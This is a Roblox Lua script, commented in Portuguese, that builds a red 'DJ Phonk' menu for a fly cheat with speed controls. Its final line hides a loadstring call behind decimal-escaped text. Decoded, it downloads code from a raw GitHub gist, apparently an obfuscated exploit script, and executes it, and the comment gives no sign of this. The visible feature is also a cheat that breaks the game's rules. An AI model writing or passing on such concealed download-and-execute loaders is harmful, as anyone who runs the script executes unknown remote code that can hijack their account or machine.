-- Criar GUI com título "DJ Phonk" e fundo vermelho escuro

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local FlyButton = Instance.new("TextButton")
local SpeedLabel = Instance.new("TextLabel")
local IncreaseSpeed = Instance.new("TextButton")
local DecreaseSpeed = Instance.new("TextButton")

local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.Name = "DJPhonkFlyGUI"

-- Fundo escuro vermelho
Frame.Size = UDim2.new(0, 220, 0, 200)
Frame.Position = UDim2.new(0, 20, 0, 20)
Frame.BackgroundColor3 = Color3.fromRGB(120, 0, 0) -- Vermelho escuro
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Título "DJ Phonk"
Title.Size = UDim2.new(0, 200, 0, 30)
Title.Position = UDim2.new(0, 10, 0, 5)
Title.Text = "DJ Phonk"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextScaled = true
Title.Parent = Frame

-- Botão de Ativar Fly
FlyButton.Size = UDim2.new(0, 200, 0, 40)
FlyButton.Position = UDim2.new(0, 10, 0, 40)
FlyButton.Text = "Ativar Fly"
FlyButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0) -- Combina melhor
FlyButton.TextColor3 = Color3.fromRGB(255,255,255)
FlyButton.Font = Enum.Font.GothamBold
FlyButton.TextScaled = true
FlyButton.Parent = Frame

-- Label de Velocidade
SpeedLabel.Size = UDim2.new(0, 200, 0, 30)
SpeedLabel.Position = UDim2.new(0, 10, 0, 90)
SpeedLabel.Text = "Velocidade: 100"
SpeedLabel.BackgroundColor3 = Color3.fromRGB(90, 0, 0)
SpeedLabel.TextColor3 = Color3.fromRGB(255,255,255)
SpeedLabel.Font = Enum.Font.Gotham
SpeedLabel.TextScaled = true
SpeedLabel.Parent = Frame

-- Botão de Aumentar Velocidade
IncreaseSpeed.Size = UDim2.new(0, 95, 0, 30)
IncreaseSpeed.Position = UDim2.new(0, 10, 0, 140)
IncreaseSpeed.Text = "+"
IncreaseSpeed.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
IncreaseSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
IncreaseSpeed.Font = Enum.Font.GothamBold
IncreaseSpeed.TextScaled = true
IncreaseSpeed.Parent = Frame

-- Botão de Diminuir Velocidade
DecreaseSpeed.Size = UDim2.new(0, 95, 0, 30)
DecreaseSpeed.Position = UDim2.new(0, 115, 0, 140)
DecreaseSpeed.Text = "-"
DecreaseSpeed.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
DecreaseSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
DecreaseSpeed.Font = Enum.Font.GothamBold
DecreaseSpeed.TextScaled = true
DecreaseSpeed.Parent = Frame

-- Fly System Suave
local flying = false
local speed = 100
local bodyGyro, bodyVelocity

local function fly()
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    
    -- Criar BodyGyro e BodyVelocity
    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.P = 9e4
    bodyGyro.MaxTorque = Vector3.new(400000, 400000, 400000)
    bodyGyro.Parent = hrp

    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(400000, 400000, 400000)
    bodyVelocity.Parent = hrp

    -- Atualizar o movimento no RenderStepped
    rs.RenderStepped:Connect(function()
        if flying then
            local camCF = workspace.CurrentCamera.CFrame
            local move = Vector3.new(0, 0, 0)
            if uis:IsKeyDown(Enum.KeyCode.W) then
                move = move + camCF.LookVector
            end
            if uis:IsKeyDown(Enum.KeyCode.S) then
                move = move - camCF.LookVector
            end
            if uis:IsKeyDown(Enum.KeyCode.A) then
                move = move - camCF.RightVector
            end
            if uis:IsKeyDown(Enum.KeyCode.D) then
                move = move + camCF.RightVector
            end
            if uis:IsKeyDown(Enum.KeyCode.Space) then
                move = move + Vector3.new(0, 1, 0)
            end
            if uis:IsKeyDown(Enum.KeyCode.LeftControl) then
                move = move - Vector3.new(0, 1, 0)
            end

            -- Atualizar a CFrame do BodyGyro e a velocidade do BodyVelocity
            bodyGyro.CFrame = camCF
            bodyVelocity.Velocity = move.Unit * speed
        end
    end)
end

-- Ação do botão de ativar/desativar fly
FlyButton.MouseButton1Click:Connect(function()
    flying = not flying
    if flying then
        FlyButton.Text = "Desativar Fly"
        fly()
    else
        FlyButton.Text = "Ativar Fly"
        if bodyGyro then bodyGyro:Destroy() end
        if bodyVelocity then bodyVelocity:Destroy() end
    end
end)

-- Aumentar a velocidade
IncreaseSpeed.MouseButton1Click:Connect(function()
    speed = speed + 10
    SpeedLabel.Text = "Velocidade: " .. speed
end)

-- Diminuir a velocidade
DecreaseSpeed.MouseButton1Click:Connect(function()
    speed = math.max(10, speed - 10)
    SpeedLabel.Text = "Velocidade: " .. speed
end)

-- Função de "loadstring" igual à do vídeo
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\57\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\54\50\53\98\48\54\48\100\102\53\50\51\51\54\52\51\99\102\51\48\98\55\56\57\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
